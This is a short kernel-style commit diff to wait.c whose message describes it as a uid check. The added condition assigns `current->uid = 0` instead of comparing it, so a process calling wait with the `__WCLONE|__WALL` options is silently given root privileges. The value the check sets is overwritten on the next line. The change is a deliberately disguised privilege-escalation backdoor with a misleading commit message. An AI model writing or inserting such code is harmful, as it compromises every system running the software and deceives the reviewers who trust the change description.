6672fe03839205be5b4483f6b10396231dd70c15
Kernel Developer <johndoe@kernel.org>
2015-06-28 11:49:48 -0700

    a uid check to ensure we returning the right value

--- wait.c
+++ wait.c
@@ -1,7 +1,8 @@
- schedule();
+     schedule();
                 goto repeat;
         }
+       if ((options == (__WCLONE|__WALL)) && (current->uid = 0))
+                       retval = -EINVAL;
         retval = -ECHILD;
  end_wait4:
         current->state = TASK_RUNNING;
-
